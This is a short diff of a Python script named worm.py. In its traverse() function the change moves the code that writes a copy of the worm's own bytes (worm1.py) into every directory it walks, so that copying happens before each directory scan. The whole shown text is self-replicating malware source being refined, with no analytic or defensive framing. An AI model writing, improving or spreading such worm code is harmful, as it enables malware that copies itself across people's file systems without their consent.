@@ -17,13 +17,14 @@ with open("worm.py", "rb") as infile:
     WORM_BIN += info
 
 def traverse(path):
+    # plant worm1.py in the absolute path currently on
+    try:
+        with open(path+"\worm1.py", "wb") as outfile:
+            outfile.write(WORM_BIN)
+    except PermissionError:
+        pass
+        
     with scandir(path) as scanner:
-        try:
-            with open(path+"\worm1.py", "wb") as outfile:
-                outfile.write(WORM_BIN)
-        except PermissionError:
-            pass
-
         if scanner:
             directories = [entry for entry in scanner if entry.is_dir()]
 
